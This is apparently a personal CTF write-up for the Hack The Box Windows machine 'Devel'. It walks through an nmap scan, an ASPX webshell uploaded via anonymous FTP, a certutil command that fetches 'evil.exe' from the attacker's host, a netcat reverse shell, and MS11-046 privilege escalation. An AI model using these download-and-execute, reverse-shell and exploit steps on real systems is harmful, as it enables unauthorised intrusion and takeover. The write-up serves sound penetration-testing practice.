---
title: CTF Writeup - HTB Devel
date: 2023-11-13
author: kei5uke
description: Writeup for HTB Devel
tags:
  - windows
  - writeup
---

# Devel

# Enumeration

## Nmap

```bash
┌──(root💀kali)-[~/devel]
└─# nmap -sV -sC -T4 -p- 10.129.105.132 -oN nmap.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-13 18:41 EET
Nmap scan report for 10.129.105.132
Host is up (0.054s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.43 seconds
```

## FTP

FTP is readable and writeable

![Screenshot 2023-11-13 at 18.48.24.png](Devel%20f19bb8bb1789445f9b40f3338077e67b/Screenshot_2023-11-13_at_18.48.24.png)

I uploaded command aspx file from /usr/share/webshells/ 

Looks like its working. But I need a proper shell.

![Screenshot 2023-11-13 at 19.09.35.png](Devel%20f19bb8bb1789445f9b40f3338077e67b/Screenshot_2023-11-13_at_19.09.35.png)

I used the command below:

```bash
certutil.exe -urlcache -split -f "http://192.168.49.68/evil.exe" "C:\Backup\evil.exe"
```

![Screenshot 2023-11-13 at 19.24.09.png](Devel%20f19bb8bb1789445f9b40f3338077e67b/Screenshot_2023-11-13_at_19.24.09.png)

![Screenshot 2023-11-13 at 19.24.53.png](Devel%20f19bb8bb1789445f9b40f3338077e67b/Screenshot_2023-11-13_at_19.24.53.png)

I got first shell.

```bash
┌──(root💀kali)-[/opt/generic]
└─# rlwrap nc -lvnp 21                                                         
listening on [any] 21 ...
connect to [10.10.16.23] from (UNKNOWN) [10.129.105.132] 49186
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```

# Privilege Escalation

sysinfo

```bash
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          13/11/2023, 6:40:33 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.063 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.142 MB
Virtual Memory: In Use:    999 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.105.132
                                 [02]: fe80::303f:619:f6ed:cb15
                                 [03]: dead:beef::b027:6d8a:fa22:9574
                                 [04]: dead:beef::303f:619:f6ed:cb15
```

I found the usable script.

[Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)](https://www.exploit-db.com/exploits/40564)

Compiled the script and downloaded.

```bash
┌──(root💀kali)-[/opt/generic]
└─# i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
                                                                                                                              
┌──(root💀kali)-[/opt/generic]
└─# python3 -m http.server 80                               
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.105.132 - - [13/Nov/2023 19:41:01] "GET /MS11-046.exe HTTP/1.1" 200 -
```

# Root shell

![Screenshot 2023-11-13 at 19.43.39.png](Devel%20f19bb8bb1789445f9b40f3338077e67b/Screenshot_2023-11-13_at_19.43.39.png)

# Note

You can try asp or aspx for getting reverse shell.

Old windows tends to be easily exploitable with just one script.